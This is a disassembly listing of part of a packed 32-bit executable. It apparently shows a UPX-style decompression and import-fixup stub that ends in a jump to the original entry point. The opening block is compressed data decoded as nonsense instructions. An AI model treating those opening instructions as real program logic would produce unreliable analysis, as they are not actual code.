  42e1b1:	00 0f                	add    %cl,(%edi)
  42e1b3:	01 0b                	add    %ecx,(%ebx)
  42e1b5:	01 06                	add    %eax,(%esi)
  42e1b7:	00 da                	add    %bl,%dl
  42e1b9:	62 1f                	bound  %ebx,(%edi)
  42e1bb:	66 bf 08 f5          	mov    $0xf508,%di
  42e1bf:	18 b8 02 f2 03 00    	sbb    %bh,0x3f202(%eax)
  42e1c5:	40                   	inc    %eax
  42e1c6:	07                   	pop    %es
  42e1c7:	64 1b 36             	sbb    %fs:(%esi),%esi
  42e1ca:	eb 12                	jmp    0x42e1de
  42e1cc:	04 25                	add    $0x25,%al
  42e1ce:	07                   	pop    %es
  42e1cf:	14 d0                	adc    $0xd0,%al
  42e1d1:	0d ec 2c f6 c0       	or     $0xc0f62cec,%eax
  42e1d6:	69 1e 30 10 07 08    	imul   $0x8071030,(%esi),%ebx
  42e1dc:	f9                   	stc
  42e1dd:	4b                   	dec    %ebx
  42e1de:	e0 06                	loopne 0x42e1e6
  42e1e0:	8d 80 ba 02 00 78    	lea    0x780002ba(%eax),%eax
  42e1e6:	7a 85                	jp     0x42e16d
  42e1e8:	dc 0e                	fmull  (%esi)
  42e1ea:	60                   	pusha
  42e1eb:	57                   	push   %edi
  42e1ec:	88 01                	mov    %al,(%ecx)
  42e1ee:	2e 62 5d 60          	bound  %ebx,%cs:0x60(%ebp)
  42e1f2:	6f                   	outsl  %ds:(%esi),(%dx)
  42e1f3:	e7 16                	out    %eax,$0x16
  42e1f5:	00 90 47 d7 23 80    	add    %dl,-0x7fdc28b9(%eax)
  42e1fb:	c9                   	leave
  42e1fc:	ce                   	into
  42e1fd:	41                   	inc    %ecx
  42e1fe:	d1 c6                	rol    $1,%esi
  42e200:	2e 34 53             	cs xor $0x53,%al
  42e203:	06                   	push   %es
  42e204:	61                   	popa
  42e205:	ca 2f 6c             	lret   $0x6c2f
  42e208:	84 0f                	test   %cl,(%edi)
  42e20a:	04 29                	add    $0x29,%al
  42e20c:	40                   	inc    %eax
  42e20d:	00 04 e0             	add    %al,(%eax,%eiz,8)
  42e210:	a0 00 b0 dd 1b       	mov    0x1bddb000,%al
  42e215:	80 bc 03 22 75 00 00 	cmpb   $0x0,0x7522(%ebx,%eax,1)
  42e21c:	00 
  42e21d:	00 00                	add    %al,(%eax)
  42e21f:	00 90 00 ff 00 00    	add    %dl,0xff00(%eax)
	...
  42e22d:	00 00                	add    %al,(%eax)
  42e22f:	00 60 be             	add    %ah,-0x42(%eax)
  42e232:	00 b0 42 00 8d be    	add    %dh,-0x4172ffbe(%eax)
  42e238:	00 60 fd             	add    %ah,-0x3(%eax)
  42e23b:	ff 57 83             	call   *-0x7d(%edi)
  42e23e:	cd ff                	int    $0xff
  42e240:	eb 10                	jmp    0x42e252
  42e242:	90                   	nop
  42e243:	90                   	nop
  42e244:	90                   	nop
  42e245:	90                   	nop
  42e246:	90                   	nop
  42e247:	90                   	nop
  42e248:	8a 06                	mov    (%esi),%al
  42e24a:	46                   	inc    %esi
  42e24b:	88 07                	mov    %al,(%edi)
  42e24d:	47                   	inc    %edi
  42e24e:	01 db                	add    %ebx,%ebx
  42e250:	75 07                	jne    0x42e259
  42e252:	8b 1e                	mov    (%esi),%ebx
  42e254:	83 ee fc             	sub    $0xfffffffc,%esi
  42e257:	11 db                	adc    %ebx,%ebx
  42e259:	72 ed                	jb     0x42e248
  42e25b:	b8 01 00 00 00       	mov    $0x1,%eax
  42e260:	01 db                	add    %ebx,%ebx
  42e262:	75 07                	jne    0x42e26b
  42e264:	8b 1e                	mov    (%esi),%ebx
  42e266:	83 ee fc             	sub    $0xfffffffc,%esi
  42e269:	11 db                	adc    %ebx,%ebx
  42e26b:	11 c0                	adc    %eax,%eax
  42e26d:	01 db                	add    %ebx,%ebx
  42e26f:	73 ef                	jae    0x42e260
  42e271:	75 09                	jne    0x42e27c
  42e273:	8b 1e                	mov    (%esi),%ebx
  42e275:	83 ee fc             	sub    $0xfffffffc,%esi
  42e278:	11 db                	adc    %ebx,%ebx
  42e27a:	73 e4                	jae    0x42e260
  42e27c:	31 c9                	xor    %ecx,%ecx
  42e27e:	83 e8 03             	sub    $0x3,%eax
  42e281:	72 0d                	jb     0x42e290
  42e283:	c1 e0 08             	shl    $0x8,%eax
  42e286:	8a 06                	mov    (%esi),%al
  42e288:	46                   	inc    %esi
  42e289:	83 f0 ff             	xor    $0xffffffff,%eax
  42e28c:	74 74                	je     0x42e302
  42e28e:	89 c5                	mov    %eax,%ebp
  42e290:	01 db                	add    %ebx,%ebx
  42e292:	75 07                	jne    0x42e29b
  42e294:	8b 1e                	mov    (%esi),%ebx
  42e296:	83 ee fc             	sub    $0xfffffffc,%esi
  42e299:	11 db                	adc    %ebx,%ebx
  42e29b:	11 c9                	adc    %ecx,%ecx
  42e29d:	01 db                	add    %ebx,%ebx
  42e29f:	75 07                	jne    0x42e2a8
  42e2a1:	8b 1e                	mov    (%esi),%ebx
  42e2a3:	83 ee fc             	sub    $0xfffffffc,%esi
  42e2a6:	11 db                	adc    %ebx,%ebx
  42e2a8:	11 c9                	adc    %ecx,%ecx
  42e2aa:	75 20                	jne    0x42e2cc
  42e2ac:	41                   	inc    %ecx
  42e2ad:	01 db                	add    %ebx,%ebx
  42e2af:	75 07                	jne    0x42e2b8
  42e2b1:	8b 1e                	mov    (%esi),%ebx
  42e2b3:	83 ee fc             	sub    $0xfffffffc,%esi
  42e2b6:	11 db                	adc    %ebx,%ebx
  42e2b8:	11 c9                	adc    %ecx,%ecx
  42e2ba:	01 db                	add    %ebx,%ebx
  42e2bc:	73 ef                	jae    0x42e2ad
  42e2be:	75 09                	jne    0x42e2c9
  42e2c0:	8b 1e                	mov    (%esi),%ebx
  42e2c2:	83 ee fc             	sub    $0xfffffffc,%esi
  42e2c5:	11 db                	adc    %ebx,%ebx
  42e2c7:	73 e4                	jae    0x42e2ad
  42e2c9:	83 c1 02             	add    $0x2,%ecx
  42e2cc:	81 fd 00 f3 ff ff    	cmp    $0xfffff300,%ebp
  42e2d2:	83 d1 01             	adc    $0x1,%ecx
  42e2d5:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  42e2d8:	83 fd fc             	cmp    $0xfffffffc,%ebp
  42e2db:	76 0f                	jbe    0x42e2ec
  42e2dd:	8a 02                	mov    (%edx),%al
  42e2df:	42                   	inc    %edx
  42e2e0:	88 07                	mov    %al,(%edi)
  42e2e2:	47                   	inc    %edi
  42e2e3:	49                   	dec    %ecx
  42e2e4:	75 f7                	jne    0x42e2dd
  42e2e6:	e9 63 ff ff ff       	jmp    0x42e24e
  42e2eb:	90                   	nop
  42e2ec:	8b 02                	mov    (%edx),%eax
  42e2ee:	83 c2 04             	add    $0x4,%edx
  42e2f1:	89 07                	mov    %eax,(%edi)
  42e2f3:	83 c7 04             	add    $0x4,%edi
  42e2f6:	83 e9 04             	sub    $0x4,%ecx
  42e2f9:	77 f1                	ja     0x42e2ec
  42e2fb:	01 cf                	add    %ecx,%edi
  42e2fd:	e9 4c ff ff ff       	jmp    0x42e24e
  42e302:	5e                   	pop    %esi
  42e303:	8d be 00 c0 02 00    	lea    0x2c000(%esi),%edi
  42e309:	8b 07                	mov    (%edi),%eax
  42e30b:	09 c0                	or     %eax,%eax
  42e30d:	74 45                	je     0x42e354
  42e30f:	8b 5f 04             	mov    0x4(%edi),%ebx
  42e312:	8d 84 30 00 e0 02 00 	lea    0x2e000(%eax,%esi,1),%eax
  42e319:	01 f3                	add    %esi,%ebx
  42e31b:	50                   	push   %eax
  42e31c:	83 c7 08             	add    $0x8,%edi
  42e31f:	ff 96 78 e0 02 00    	call   *0x2e078(%esi)
  42e325:	95                   	xchg   %eax,%ebp
  42e326:	8a 07                	mov    (%edi),%al
  42e328:	47                   	inc    %edi
  42e329:	08 c0                	or     %al,%al
  42e32b:	74 dc                	je     0x42e309
  42e32d:	89 f9                	mov    %edi,%ecx
  42e32f:	79 07                	jns    0x42e338
  42e331:	0f b7 07             	movzwl (%edi),%eax
  42e334:	47                   	inc    %edi
  42e335:	50                   	push   %eax
  42e336:	47                   	inc    %edi
  42e337:	b9 57 48 f2 ae       	mov    $0xaef24857,%ecx
  42e33c:	55                   	push   %ebp
  42e33d:	ff 96 7c e0 02 00    	call   *0x2e07c(%esi)
  42e343:	09 c0                	or     %eax,%eax
  42e345:	74 07                	je     0x42e34e
  42e347:	89 03                	mov    %eax,(%ebx)
  42e349:	83 c3 04             	add    $0x4,%ebx
  42e34c:	eb d8                	jmp    0x42e326
  42e34e:	ff 96 8c e0 02 00    	call   *0x2e08c(%esi)
  42e354:	8b ae 80 e0 02 00    	mov    0x2e080(%esi),%ebp
  42e35a:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
  42e360:	bb 00 10 00 00       	mov    $0x1000,%ebx
  42e365:	50                   	push   %eax
  42e366:	54                   	push   %esp
  42e367:	6a 04                	push   $0x4
  42e369:	53                   	push   %ebx
  42e36a:	57                   	push   %edi
  42e36b:	ff d5                	call   *%ebp
  42e36d:	8d 87 0f 02 00 00    	lea    0x20f(%edi),%eax
  42e373:	80 20 7f             	andb   $0x7f,(%eax)
  42e376:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
  42e37a:	58                   	pop    %eax
  42e37b:	50                   	push   %eax
  42e37c:	54                   	push   %esp
  42e37d:	50                   	push   %eax
  42e37e:	53                   	push   %ebx
  42e37f:	57                   	push   %edi
  42e380:	ff d5                	call   *%ebp
  42e382:	58                   	pop    %eax
  42e383:	61                   	popa
  42e384:	8d 44 24 80          	lea    -0x80(%esp),%eax
  42e388:	6a 00                	push   $0x0
  42e38a:	39 c4                	cmp    %eax,%esp
  42e38c:	75 fa                	jne    0x42e388
  42e38e:	83 ec 80             	sub    $0xffffff80,%esp
  42e391:	e9 82 d4 ff ff       	jmp    0x42b818
	...
